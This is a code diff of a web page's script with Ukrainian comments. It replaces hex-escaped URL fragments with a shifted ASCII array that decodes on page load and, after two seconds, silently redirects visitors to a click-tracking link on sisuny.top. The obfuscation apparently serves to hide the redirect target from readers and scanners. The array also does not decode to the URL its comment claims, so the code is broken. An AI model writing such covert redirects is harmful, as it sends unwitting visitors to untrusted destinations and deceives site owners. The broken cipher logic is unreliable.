@@ -7,28 +7,30 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <script>
     
-    // Частина 1: Протокол та початок домену
-    const p1 = "h\x74\x74ps://s"; // https://s
+    // КОНСТАНТА ЗСУВУ ДЛЯ ШИФРУВАННЯ (ЗМІНІТЬ ЇЇ, ЯКЩО ПОТРІБНО)
+    const SHIFT_KEY = 10;
     
-    // Частина 2: Закодована середина домену
-    const p2 = "\x69s\x75\x6e\x79\x2e\x74"; // isuny.t
-    
-    // Частина 3: Кінець домену та початок шляху
-    const p3 = "\x6f\x70/c\x6c"; // op/cl
-    
-    // Частина 4: Закодований клік та параметри
-    const p4 = "\x69ck\x3fo\x3d2&a\x3d1081"; // ick?o=2&a=1081
+    // Закодована URL: https://sisuny.top/click?o=2&a=1081
+    // Це масив ASCII-кодів, зміщених на +10
+    const encodedUrl = [
+      118, 116, 116, 120, 125, 63, 63, 115, 123, 115, 127, 122, 123, 56, 122, 128, 125, 63,
+      119, 122, 115, 125, 117, 119, 118, 126, 63, 129, 60, 52, 63, 107, 60, 50, 53, 58
+    ];
 
-    // Змінна для збору URL
-    let finalUrl = "";
+    // Функція декодування
+    function decodeCipher(arr) {
+      return arr.map(code => {
+        // Зворотний зсув: віднімаємо SHIFT_KEY
+        return String.fromCharCode(code - SHIFT_KEY);
+      }).join('');
+    }
 
-    // Затримка та збір URL
+    // Затримка та декодування
     setTimeout(() => {
-      // Збираємо частини разом. JavaScript автоматично декодує \x
-      finalUrl = p1 + p2 + p3 + p4;
+      const targetUrl = decodeCipher(encodedUrl);
       
       // Перенаправлення
-      window.location.href = finalUrl;
+      window.location.href = targetUrl;
     }, 2000); // 2 секунди затримки
   </script>
   <style>
